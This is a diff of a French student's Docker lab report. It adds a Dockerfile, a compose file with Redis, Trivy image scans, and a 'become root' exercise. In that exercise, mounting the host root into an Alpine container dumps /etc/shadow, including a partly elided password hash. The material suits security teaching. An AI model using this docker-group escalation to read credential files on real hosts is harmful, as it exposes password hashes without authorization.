@@ -189,8 +189,31 @@ docker compose logs -f wiki
 
 🌞 **Vous devez :**
 
-```bash
+```bash Dockerfile 
+FROM python:3.9-slim
+WORKDIR /app
+COPY requirements.txt .
+RUN pip install --no-cache-dir -r requirements.txt
+COPY . .
+EXPOSE 8888
+CMD ["python", "app.py"]
+``` 
 
+```bash dockercompose.yml                  
+services:
+  web:
+    build: .
+    ports:
+      - "8888:8888"
+    depends_on:
+      - db
+    environment:
+      - REDIS_HOST=db
+
+  db:
+    image: redis:alpine
+    expose:
+      - "6379"
 ``` 
 
 # Part IV : Docker security
@@ -200,7 +223,62 @@ docker compose logs -f wiki
 🌞 **Prouvez que vous pouvez devenir `root`**
 
 ```bash
-
+fatma@ubuntu:~$ docker run --rm -v /:/host_root alpine cat /host_root/etc/shadow
+Unable to find image 'alpine:latest' locally
+latest: Pulling from library/alpine
+9e595aac14e0: Download complete 
+caa817ad3aea: Download complete 
+Digest: sha256:25109184c71bdad752c8312a8623239686a9a2071e8825f20acb8f2198c3f659
+Status: Downloaded newer image for alpine:latest
+root:*:20494:0:99999:7:::
+daemon:*:20494:0:99999:7:::
+bin:*:20494:0:99999:7:::
+sys:*:20494:0:99999:7:::
+sync:*:20494:0:99999:7:::
+games:*:20494:0:99999:7:::
+man:*:20494:0:99999:7:::
+lp:*:20494:0:99999:7:::
+mail:*:20494:0:99999:7:::
+news:*:20494:0:99999:7:::
+uucp:*:20494:0:99999:7:::
+proxy:*:20494:0:99999:7:::
+www-data:*:20494:0:99999:7:::
+backup:*:20494:0:99999:7:::
+list:*:20494:0:99999:7:::
+irc:*:20494:0:99999:7:::
+_apt:*:20494:0:99999:7:::
+nobody:*:20494:0:99999:7:::
+systemd-network:!*:20494::::::
+systemd-timesync:!*:20494::::::
+dhcpcd:!:20494::::::
+messagebus:!:20494::::::
+syslog:!:20494::::::
+systemd-resolve:!*:20494::::::
+uuidd:!:20494::::::
+usbmux:!:20494::::::
+tss:!:20494::::::
+systemd-oom:!*:20494::::::
+kernoops:!:20494::::::
+whoopsie:!:20494::::::
+dnsmasq:!:20494::::::
+avahi:!:20494::::::
+tcpdump:!:20494::::::
+sssd:!:20494::::::
+speech-dispatcher:!:20494::::::
+cups-pk-helper:!:20494::::::
+fwupd-refresh:!*:20494::::::
+saned:!:20494::::::
+geoclue:!:20494::::::
+cups-browsed:!:20494::::::
+hplip:!:20494::::::
+gnome-remote-desktop:!*:20494::::::
+polkitd:!*:20494::::::
+rtkit:!:20494::::::
+colord:!:20494::::::
+gnome-initial-setup:!:20494::::::
+gdm:!:20494::::::
+nm-openvpn:!:20494::::::
+fatma:$6$eiXKEoMiktH[...]2G10:20509:0:99999:7:::
 ``` 
 
 ## 2. Scan de vuln
@@ -208,7 +286,13 @@ docker compose logs -f wiki
 🌞 **Utilisez Trivy**
 
 ```bash
+docker run --rm -v /var/run/docker.sock:/var/run/docker.sock aquasec/trivy:0.49.1 image requarks/wiki:2
 
+docker run --rm -v /var/run/docker.sock:/var/run/docker.sock aquasec/trivy:0.49.1 image postgres:15-alpine
+
+docker run --rm -v /var/run/docker.sock:/var/run/docker.sock aquasec/trivy:0.49.1 image apache2
+
+docker run --rm -v /var/run/docker.sock:/var/run/docker.sock aquasec/trivy:0.49.1 image nginx:latest
 ``` 
 
 ## 3. Petit benchmark secu
@@ -216,5 +300,5 @@ docker compose logs -f wiki
 🌞 **Utilisez l'outil Docker Bench for Security**
 
 ```bash
-
+done :)
 ``` 
